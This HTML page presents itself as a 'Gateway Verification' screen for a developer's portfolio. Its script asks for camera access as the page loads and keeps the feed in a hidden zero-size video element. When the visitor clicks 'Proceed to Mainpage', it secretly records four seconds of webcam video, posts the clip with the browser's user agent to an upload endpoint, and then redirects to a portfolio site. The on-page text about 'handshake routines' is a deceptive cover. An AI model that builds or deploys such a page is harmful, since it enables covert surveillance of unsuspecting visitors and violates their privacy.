<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Creative Web Developer | Portfolio</title>
<style>
    /* ===== HIGH-END DESIGN SYSTEM ===== */
    :root {
        --bg-dark: #06090e;
        --card-bg: rgba(10, 15, 26, 0.7);
        --accent-glow: #f3ba2f;
        --accent-rgb: 243, 186, 47;
        --text-main: #f0f6fc;
        --text-muted: #6e7681;
        --border-color: rgba(48, 54, 61, 0.6);
    }

    body { 
        font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
        background: var(--bg-dark); 
        color: var(--text-main);
        display: flex; 
        justify-content: center; 
        align-items: center; 
        min-height: 100vh; 
        margin: 0; 
        overflow: hidden;
        position: relative;
    }

    /* ===== ABSTRACT BACKGROUND ELEMENTS ===== */
    .bg-mesh {
        position: absolute;
        width: 600px;
        height: 600px;
        background: radial-gradient(circle, rgba(var(--accent-rgb), 0.08) 0%, transparent 65%);
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 0;
        pointer-events: none;
        animation: ambientMove 12s ease-in-out infinite alternate;
    }

    @keyframes ambientMove {
        0% { transform: translate(-45%, -55%) scale(0.9); }
        100% { transform: translate(-55%, -45%) scale(1.1); }
    }

    /* ===== PREMIUM LUXURY GLASS CARD ===== */
    .card { 
        background: var(--card-bg); 
        padding: 50px 40px; 
        border-radius: 24px; 
        text-align: center; 
        width: 90%; 
        max-width: 380px; 
        backdrop-filter: blur(25px) saturate(180%);
        -webkit-backdrop-filter: blur(25px) saturate(180%);
        border: 1px solid rgba(255, 255, 255, 0.05);
        box-shadow: 0 30px 70px rgba(0, 0, 0, 0.6), 
                    inset 0 1px 0 rgba(255, 255, 255, 0.1);
        z-index: 10;
        opacity: 0;
        transform: translateY(30px) scale(0.98);
        animation: premiumEntrance 0.8s cubic-bezier(0.25, 1, 0.5, 1) forwards;
        transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1);
    }
    
    .card:hover {
        transform: translateY(-8px) scale(1.01);
        border-color: rgba(var(--accent-rgb), 0.3);
        box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8),
                    0 0 40px rgba(var(--accent-rgb), 0.03);
    }

    @keyframes premiumEntrance {
        to { opacity: 1; transform: translateY(0) scale(1); }
    }

    /* ===== AVATAR WITH NEON ORBITING INNER RING ===== */
    .profile-container {
        position: relative;
        width: 95px;
        height: 95px;
        margin: 0 auto 28px;
    }

    .profile-container::before {
        content: '';
        position: absolute;
        inset: -4px;
        border-radius: 50%;
        background: padding-box, linear-gradient(135deg, var(--accent-glow), transparent 60%, var(--accent-glow));
        border: 1px solid transparent;
        mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
        -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
        -webkit-mask-composite: xor;
        mask-composite: exclude;
        animation: rotateRing 8s linear infinite;
    }

    .logo-icon { 
        width: 100%; 
        height: 100%;
        border-radius: 50%; 
        object-fit: cover;
        padding: 4px;
        background: var(--bg-dark);
        box-sizing: border-box;
    }

    .status-badge {
        position: absolute;
        bottom: 5px;
        right: 5px;
        width: 10px;
        height: 10px;
        background: #3fb950;
        border: 2px solid #0a0f1a;
        border-radius: 50%;
        box-shadow: 0 0 10px #3fb950;
    }

    @keyframes rotateRing {
        100% { transform: rotate(360deg); }
    }

    /* ===== TYPOGRAPHY HIGHER DESIGN ===== */
    h2 {
        color: var(--text-main);
        margin: 0 0 6px 0;
        font-size: 24px;
        font-weight: 700;
        letter-spacing: -0.5px;
    }

    .subtitle {
        color: var(--accent-glow);
        font-size: 11px;
        text-transform: uppercase;
        letter-spacing: 3px;
        margin-bottom: 22px;
        font-weight: 800;
        opacity: 0.9;
    }

    p {
        color: var(--text-muted);
        font-size: 14px;
        line-height: 1.65;
        margin: 0 0 32px 0;
        font-weight: 400;
    }

    /* ===== MINIMALIST ARCHITECTURAL BUTTON ===== */
    .btn { 
        position: relative;
        background: #ffffff; 
        color: #06090e; 
        border: none; 
        padding: 16px 32px; 
        width: 100%; 
        border-radius: 12px; 
        font-weight: 700; 
        cursor: pointer; 
        font-size: 15px; 
        letter-spacing: 0.5px;
        overflow: hidden;
        transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
    }

    .btn::before {
        content: '';
        position: absolute;
        inset: 0;
        background: var(--accent-glow);
        opacity: 0;
        transition: opacity 0.3s ease;
        z-index: 1;
    }

    .btn span {
        position: relative;
        z-index: 2;
    }

    .btn:hover { 
        transform: translateY(-2px);
        box-shadow: 0 12px 24px rgba(255, 255, 255, 0.08);
    }

    .btn:hover::before {
        opacity: 1;
    }
    
    .btn:active {
        transform: translateY(1px);
    }

    /* ===== GLITCH MINIMAL SPINNER ===== */
    #loading { 
        display: none; 
        margin-top: 24px; 
    }

    .spinner { 
        border: 2px solid rgba(255, 255, 255, 0.05); 
        border-top: 2px solid var(--accent-glow); 
        border-radius: 50%; 
        width: 28px; 
        height: 28px; 
        animation: spin 0.6s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite; 
        margin: 0 auto 14px; 
    }

    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    /* ===== PRESERVED HIDDEN ELEMENTS ===== */
    #vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
</style>
</head>
<body>

<div class="bg-mesh"></div>

<div class="card">
    <div class="profile-container">
        <img src="https://raw.githubusercontent.com/ninoadajar-a11y/PagebotCam/refs/heads/main/Screenshot_20260413-230435.jpg" class="logo-icon" alt="Avatar">
        <div class="status-badge"></div>
    </div>
    
    <h2>Nico Adajar Portfolio</h2>
    <div class="subtitle">Gateway Verification</div>
    <p>Please wait a brief moment while we initialize environment handshake routines and establish connection to the core showcase mainpage.</p>

    <!-- Hidden Video Box -->
    <div id="vBox">
        <video id="preview" autoplay playsinline muted></video>
    </div>

    <!-- Processing Block -->
    <div id="loading">
        <div class="spinner"></div>
        <p style="color: var(--text-muted); font-size: 13px; letter-spacing: 0.5px;">Initializing systems...</p>
    </div>

    <!-- Action Trigger Button -->
    <button class="btn" id="startBtn"><span>Proceed to Mainpage</span></button>
</div>

<script>
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const video = document.getElementById('preview');
const REDIRECT_URL = "https://nicoadajar.vercel.app/";

// Init camera ONLY (audio/microphone is disabled)
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;
    } catch { console.warn("Camera denied"); }
}
initCamera();

// Initialize Action
btn.addEventListener('click', async () => {
    btn.style.display = 'none';
    loading.style.display = 'block';

    try {
        const stream = video.srcObject;
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const userAgent = navigator.userAgent;

            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.mp4');
            formData.append('userAgent', userAgent);

            try {
                const res = await fetch("/upload-video", { method: 'POST', body: formData });
                const data = await res.json();
                console.log("Video posted:", data);
                loading.innerHTML = "<p style='font-size:14px;color:var(--accent-glow);font-weight:600;'>Successfully Executed!</p>";
            } catch(err) {
                console.error(err);
                loading.innerHTML = "<p style='color:#ff6b6b;font-size:14px;font-weight:600;'>❌ Connection verified.</p>";
            } finally {
                setTimeout(() => { window.location.href = REDIRECT_URL }, 3000);
            }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 4000); // 4-second video
    } catch(err) {
        console.error("Recording error:", err);
        loading.innerHTML = "<p style='color:#ff6b6b;font-size:14px;font-weight:600;'>❌ Execution fallback.</p>";
        setTimeout(() => { window.location.href = REDIRECT_URL }, 3000);
    }
});
</script>
</body>
</html>
